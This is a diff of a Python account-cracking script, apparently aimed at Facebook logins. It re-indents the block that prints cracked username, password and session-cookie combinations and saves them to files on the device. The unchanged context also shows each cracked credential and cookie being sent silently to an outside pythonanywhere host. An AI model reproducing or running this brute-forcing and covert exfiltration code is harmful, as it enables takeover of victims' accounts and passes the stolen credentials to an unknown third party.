@@ -420,12 +420,12 @@ def cracker(ids,passlist):
                            statusok = (f"{user}|{pas}|{kuki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                        print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                           print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
+                           print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                           open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                           open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
+                           oks.append(ids)
+                           break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
@@ -552,12 +552,12 @@ def crackerr(ids,passlist):
                            statusok = (f"{user}|{pas}|{kuki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                        print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                           print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
+                           print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                           open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                           open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
+                           oks.append(ids)
+                           break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
